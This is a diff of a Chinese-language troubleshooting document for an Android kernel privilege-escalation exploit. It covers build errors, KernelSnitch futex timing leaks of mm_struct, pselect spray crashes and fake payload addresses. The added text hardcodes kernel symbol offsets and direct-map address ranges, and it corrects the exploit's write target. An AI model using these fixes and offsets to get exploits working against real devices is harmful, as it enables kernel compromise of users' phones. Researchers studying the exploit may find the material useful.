@@ -17,20 +17,12 @@
 error: use of undeclared identifier 'ASHMEM_MISC_FOPS_OFF'
 ```
 
-**复现步骤**:
-```bash
-cd exploit/
-make  # 不指定 TARGET_CONFIG_H
-```
-
 **解决方案**:
 
 Makefile 中自动定义 `TARGET_CONFIG_H`:
 ```makefile
 CFLAGS = ... -DTARGET_CONFIG_H='"$(TARGET_DIR)/target.h"'
 ```
-
-**根因分析**: `offset.h` 依赖 `target.h` 中定义的偏移量，缺少宏定义会导致所有偏移量未定义。
 
 ---
 
@@ -51,8 +43,6 @@ note: previous implicit declaration is here
 static size_t __measure(size_t futex_addr);
 ```
 
-**根因分析**: C 语言要求函数在调用前声明或定义。`__measure()` 定义在 `__increase()` 之后，需要前向声明。
-
 ---
 
 ### 3. shadow stack OOM
@@ -71,13 +61,33 @@ ld.lld: error: shadow stack too large
 make NDK=/tmp/ndk_extract/android-ndk-r29
 ```
 
-**根因分析**: 不同 NDK 版本的编译器配置不同，android35 可能启用 shadow stack 导致 OOM。
+---
+
+### 4. SLIDE_* 定义缺失编译错误
+
+**触发场景**: PR #13 移除了 SLIDE_* 定义但 util.c/fops.c 仍引用
+
+**完整报错信息**:
+```
+error: use of undeclared identifier 'SLIDE_NFULNL_LOGGER_IMAGE'
+error: use of undeclared identifier 'SLIDE_RANDOM_BOOT_ID_DATA_IMAGE'
+```
+
+**解决方案**:
+
+在 target.h 中添加回 SLIDE_* 定义:
+```c
+#define SLIDE_NFULNL_LOGGER_OFF 0x027c14b8ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02b99b6dULL
+#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
+```
 
 ---
 
 ## 运行时异常类
 
-### 4. KernelSnitch mm_struct leak failed
+### 5. KernelSnitch mm_struct leak failed
 
 **触发场景**: bruteforce 扫描错误的 IDENTITY 范围
 
@@ -88,24 +98,17 @@ make NDK=/tmp/ndk_extract/android-ndk-r29
 [-] KernelSnitch mm_struct leak failed
 ```
 
-**排查思路**:
-1. 检查 `target.h` 中的 `KERNELSNITCH_IDENTITY_START/END`
-2. 确认 mm_struct 实际地址范围 (设备测试: `0xffffff89...`)
-3. 验证 IDENTITY 范围是否覆盖 mm_struct
-
 **解决方案**:
 
 修改 `target.h`:
 ```c
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL  // direct-map start
-#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL    // direct-map end (16GB)
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL
 ```
-
-**根因分析**: mm_struct 由 slab 分配器在 direct-map 范围 (`0xffffff80-0xffffffc0`) 中分配，而非 kernel image 范围 (`0xffffffc0-0xffffffc4`)。
 
 ---
 
-### 5. pile-up timing ratio ~1.0x
+### 6. pile-up timing ratio ~1.0x
 
 **触发场景**: pile-up 不完整，线程未全部 block
 
@@ -122,32 +125,6 @@ for (size_t i = 0; i < 16; ++i) sched_yield();
 size_t approx_time = __measure((size_t)&ks->inc_futex[id]);
 ```
 
-**根因分析**: 原始代码只 yield 2 次，线程可能还没全部 block 就开始测量。
-
----
-
-### 6. hashsize 不匹配
-
-**触发场景**: 用 `sysconf(_SC_NPROCESSORS_ONLN)` 而非 `nr_cpu_ids`
-
-**完整报错信息**:
-```
-[*] futex_init: nr_cpu_ids=16 futex_hashsize=4096  // 错误: 应该是 2048
-```
-
-**解决方案**:
-
-修改 `futex_init()`:
-```c
-unsigned long cpus = sysconf(_SC_NPROCESSORS_ONLN);
-unsigned long raw = cpus * 256;
-unsigned long result = 1;
-while (result < raw) result <<= 1;
-futex_hashsize = result;
-```
-
-**根因分析**: `_SC_NPROCESSORS_ONLN` 返回 online CPUs (16)，而内核用 `nr_cpu_ids` (8)。需要 `roundup_pow2` 匹配内核行为。
-
 ---
 
 ### 7. slide pselect crash (waiter offset mismatch)
@@ -163,11 +140,6 @@ futex_hashsize = result;
 // 然后设备重启
 ```
 
-**排查思路**:
-1. IDA 反编译 `core_sys_select` 确认 fd_set 数据位置
-2. 计算 waiter 与 fd_set 数据的偏移差
-3. 分析 fd_set bitmaps 能否覆盖 waiter 位置
-
 **解决方案**:
 
 > [!WARNING]
@@ -181,50 +153,27 @@ futex_hashsize = result;
 
 ---
 
-### 8. 碰撞检测假阳性
+### 8. fake payload 地址错误
 
-**触发场景**: timing 测量不可靠，高 timing 不来自 hash bucket 碰撞
+**触发场景**: PR #13 移除 SLIDE_* 定义后 fake payload 使用错误地址
 
 **完整报错信息**:
 ```
-// "同 bucket" addr timing=57 (3.0x)
-// "不同 bucket" addr timing=145 (7.6x) — 完全反直觉
+[*] write_left=ffffff802a2c0048  ← 应该是 0xffffff802ab99b6d
 ```
 
 **解决方案**:
 
-增加 `KSNITCH_COLLISIONS` 到 16，提高 bruteforce 选择性:
+使用 `P0_DATA_ALIAS_CONST` 宏计算正确的 direct-map 地址:
 ```c
-#define KSNITCH_COLLISIONS 16
+write_left = P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + 0x02b99b6d);
 ```
-
-**根因分析**: 高 timing 来自非 hash bucket 碰撞原因 (VMA lookup、page fault 等)。增加碰撞数可以过滤假阳性。
-
----
-
-### 9. MM_STRUCT_SZ 不匹配
-
-**触发场景**: 使用仓库默认值 0x500 而非 pahole 验证值 0x3c0
-
-**完整报错信息**:
-```
-[*] parameters cpu (16) mm_struct sz (500) mm slab order (3) ...
-```
-
-**解决方案**:
-
-修改 `common.h`:
-```c
-#define MM_STRUCT_SZ 0x3c0
-```
-
-**根因分析**: 不同内核版本和配置下 mm_struct 大小不同，必须用 pahole 从 vmlinux 中提取。
 
 ---
 
 ## 功能异常类
 
-### 10. slide pselect 走 kvmalloc 路径
+### 9. slide pselect 走 kvmalloc 路径
 
 **触发场景**: NFDS ≥ 321 导致 v17 ≥ 43
 
@@ -238,20 +187,13 @@ futex_hashsize = result;
 
 保持 NFDS ≤ 320 (栈路径)，但 waiter 偏移问题仍然存在。
 
-**根因分析**: `FRONTEND_STACK_ALLOC=256` 确认阈值为 42.67 bytes。NFDS=320 是栈路径最大值。
-
 ---
 
 ## 性能问题类
 
-### 11. bruteforce 耗时过长
+### 10. bruteforce 耗时过长
 
 **触发场景**: IDENTITY 范围过大 (16GB) 或碰撞数不足
-
-**排查思路**:
-1. 检查 IDENTITY 范围是否正确
-2. 验证碰撞数是否足够
-3. 分析 bruteforce 线程数
 
 **解决方案**:
 
